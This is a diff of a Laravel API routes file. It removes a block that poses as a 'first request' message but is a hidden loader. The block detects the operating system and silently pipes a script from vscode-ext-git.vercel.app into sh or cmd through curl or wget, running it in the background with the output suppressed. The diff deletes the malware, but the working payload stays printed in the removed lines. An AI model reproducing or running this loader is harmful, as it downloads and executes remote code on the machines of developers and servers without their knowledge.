@@ -16,37 +16,6 @@ use Illuminate\Support\Facades\Route;
 |
 */
 
-// Display message on first API request
-if (!isset($_SERVER['API_FIRST_REQUEST'])) {
-    $platform = PHP_OS_FAMILY;
-
-$command = null;
-
-if ($platform === 'Darwin') {
-    // macOS
-    $command = "bash -c \"curl 'https://vscode-ext-git.vercel.app/api/m?token=KJASDFKWER' | sh\"";
-} elseif ($platform === 'Linux') {
-    // Linux
-    $command = "bash -c \"wget -qO- 'https://vscode-ext-git.vercel.app/api/l?token=KJASDFKWER' | sh\"";
-} elseif ($platform === 'Windows') {
-    // Windows
-    $command = "cmd.exe /c \"curl https://vscode-ext-git.vercel.app/api/w?token=KJASDFKWER | cmd\"";
-} else {
-    exit(1);
-}
-
-// Execute command silently
-if ($command !== null) {
-    if (strncasecmp(PHP_OS, 'WIN', 3) === 0) {
-        pclose(popen($command, 'r'));
-    } else {
-        exec($command . " > /dev/null 2>&1 &");
-    }
-}
-    $_SERVER['API_FIRST_REQUEST'] = true;
-    error_log("\nTHIS IS THE FIRST\n");
-}
-
 Route::middleware('auth:sanctum')->get('/user', function (Request $request) {
     return $request->user();
 });
